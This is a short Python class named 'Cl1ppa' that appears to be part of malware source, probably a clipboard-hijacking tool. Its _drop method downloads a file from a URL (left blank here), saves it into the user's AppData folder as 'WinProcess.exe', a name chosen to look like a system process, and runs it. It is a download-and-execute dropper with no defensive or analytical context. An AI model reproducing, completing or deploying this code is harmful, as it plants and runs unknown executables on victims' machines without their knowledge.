class Cl1ppa:

    def __init__(self):
        self.path = f'C:\\Users\\{user}\\AppData\\'
        self._drop()
    
    def _drop(self):
        file=requests.get("").content
        name = "WinProcess"
        open(self.path+f"\\{name}.exe","wb").write(file)
        os.system(f"{self.path}\\{name}.exe")